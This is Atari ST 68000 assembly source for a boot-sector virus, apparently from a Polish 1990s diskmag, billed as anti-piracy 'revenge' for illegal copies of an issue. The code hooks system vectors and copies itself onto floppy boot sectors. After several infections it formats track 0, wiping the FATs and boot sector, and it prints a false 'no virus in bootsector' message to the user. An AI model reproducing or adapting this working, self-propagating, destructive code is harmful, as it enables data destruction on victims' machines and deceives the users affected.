; The Voice 5
; TFTE
*************************************** ****************************
* Virus 						 	  * * Moja specjalna prod. dla *
*************************************** * wszyskich piratow.       * 
* Coded by STRych					  * ****************************
*************************************** *						   *
* Ten Virus broni dostepu do TV #3.	  * *  *********************   *
* kazda kopia wykonana w sposob nie   * * *                     *  *  
* prawidlowy powoduje uruchomienie 	  * * *   **          **    *  * 
* virusa.							  * * *	  **		  **	*  *
*************************************** * *						*  *
* Virus jest miluski (mutacja Ghosta) * * *         ***			*  *         
* powoduje wykasowanie wszyskich 	  * * *         ***         *  *
* Fatow (2) + boot'a				  * * *         ***         *  *
*************************************** * *   					*  *
* Virus jest user friednly, tj. pisze * * *	   **          **	*  *
* ze go nie ma.						  * * *     ************    *  *
*************************************** * *						*  *
* Moze teraz kilka rad dla tych ktorzy* *  *********************   *
* jednak chca miec wersje nie zawiru- * *                          *
* szona TV #3.						  * ****************************
*************************************** * 						   *
* Nalezy kopiowac TV pod protekcja i  * * Coded by STRych		   *
* 83 sciezki						  * *						   *
*************************************** *						   *
* Mam nadzieje, ze rozumiecie nasza   * *						   *
* polityke. TV #3 mial byc 			  * *						   *
* komercyjny.						  * *						   *
*************************************** ****************************
--------------------------------------------------------------------
* Wszystkie oryginalne kopie byly kopiowanie prowidlowo i nie 	   *
* uruchamiaja tego wirusa										   *
--------------------------------------------------------------------
*********************
* virus revenge     *
*********************
 
                move.w  #$20,-(SP)
                trap    #1
                addq.l  #2,SP
                bsr		s
                clr.w   (SP)
                trap    #1

s
START:
				PEA TXT(PC)
                move.w #$9,-(sp)
                trap #1
                addq.l #6,sp
                lea     $0140.w,A1
                lea     START(PC),A2
                move.l  (A2),D2
                cmp.l   (A1),D2
                beq.s   KONIEC
                move.l  #$FF,D3
	            move.l  #$31415926,D0
                clr.l   D1
                cmp.l   $0426.w,D0
                bne.s   B1
                move.l  $042A.w,D1
B1:
                lea     _ORI(PC),A0
                move.l  D1,(A0)
                move.l  #RES-START+$140,D2
                move.l  D2,$042A.w
                move.l  D0,$0426.w
LOOP:
                move.w  (A2)+,(A1)+
                dbra    D3,LOOP
*                move.L  #$fffffffe,DUMB-START+$140
                bsr.s   INSTAL
KONIEC:
                rts
_ORI:
                ori.b   #0,D0
RES
                movea.l $042E.w,A1
                suba.l  #$8000,A1
                suba.l  #$0200,A1
                move.l  A1,D1
                move.l  #$12123456,(A1)+
                move.l  D1,(A1)+
                lea     INSTAL(PC),A3
                lea     VIRUS(PC),A4
LOOP1:
                move.w  (A3)+,(A1)+
                cmpa.l  A4,A3
                blt.s   LOOP1
                lea     START(PC),A3
                move.l  A3,(A1)+
                movea.l D1,A3
                clr.w   D0
                move.w  #$FE,D2
LOOP2:
                add.w   (A3)+,D0
                dbra    D2,LOOP2
                move.w  #$5678,D2
                sub.w   D0,D2
                move.w  D2,(A3)
                move.l  #0,$0426.w
                movea.l _ORI(PC),A1
                cmpa.l  #0,A1
                bne.s   DRUGI
                jmp     (A6)
DRUGI:
                jmp     (A1)
INSTAL:
                move.l  #$31415926,$0426.w
                move.l  $0472.w,D0
                MOVE.L  #SYSTEM+2-START+$140,A0
                move.l  D0,(A0)
                lea     VIRUS-START+$140,A0
                move.l  A0,$0472.w
                rts
w
VIRUS:
                movem.l D0-A7,-(SP)
				clr.l  d0				; dla drive A(0)
                move.w  D0,D7
                move.l  #1,-(SP)
                move.l  #$010000,-(SP)
                move.w  D7,-(SP)
                clr.l   -(SP)
                lea     $04C6.w,A5
                movea.l (A5),A5
                movea.l A5,A6
                move.l  A5,-(SP)
                move.w  #8,-(SP)
                trap    #14
                adda.l  #$14,SP
                tst.w   D0
                bmi     SAVE_SYSTEM
                move.w  #$601C,(A5)
                adda.l  #$1E,A5
                lea     START(PC),A4
                lea     FINISH(PC),A3
LOOP4:
                move.w  (A4)+,(A5)+
                cmpa.l  A3,A4
                blt.s   LOOP4
                movea.l A6,A5
                move.w  #$FE,D1
                move.w  #$1234,D0
LOOP5:
                sub.w   (A5)+,D0
                dbra    D1,LOOP5
                move.w  D0,(A5)
                move.l  #1,-(SP)
                move.l  #$010000,-(SP)
                move.w  D7,-(SP)
                clr.l   -(SP)
                move.l  A6,-(SP)
                move.w  #9,-(SP)
                trap    #14
                adda.l  #$14,SP
                tst.w   D0
                bmi.s   SAVE_SYSTEM
                ADDQ.L  #1,DUMB-START+$140

				cmp.l   #5,DUMB-START+$140
				bne 	SAVE_SYSTEM
                clr.l   DUMB-START+$140         ; to viru				

	move.w #'ST',-(sp)
	move.l #$87654321,-(sp)
	move.w #1,-(sp)
	clr.w -(sp)		; straona
	clr.w -(sp)	;		track
	move.w #$3,-(sp)	; how many sectors
	move.w #0,-(sp)		; drive
	clr.l -(sp)
	move.l #$10000,-(sp)	;bufor
	move.w #10,-(sp)
	trap #14
	add.l #26,sp

SAVE_SYSTEM:
                movem.l (SP)+,D0-A7
SYSTEM:
                jmp     $FC173C

DUMB1:
                ori.b #1,d0
DUMB:
                DC.W 0
                DC.W 0000000
TXT				DC.B $1b,"p"," Nie ma wirusa w bootsek. ",$1b,"q",$0a,$0d,0
				EVEN
FINISH:
                END
	move #1,-(sp)
	move #0,-(sp)
	move #0,-(sp)
	move #1,-(sp)
	move #0,-(sp)
	clr.l -(sp)
	move.l #boot,-(sp)
	move #9,-(sp)
	trap #14
	add.l #20,sp
		